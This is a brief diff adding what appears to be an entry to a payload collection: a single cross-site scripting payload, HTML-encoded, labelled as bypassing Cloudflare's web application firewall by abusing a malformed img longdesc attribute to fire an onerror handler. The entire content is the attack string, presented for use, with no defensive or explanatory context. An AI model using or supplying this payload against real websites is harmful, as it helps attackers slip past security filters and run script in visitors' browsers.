@@ -1,0 +1,3 @@
+A payload to bypass Cloudflare WAF
+
+&lt;img longdesc="src='x'onerror=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
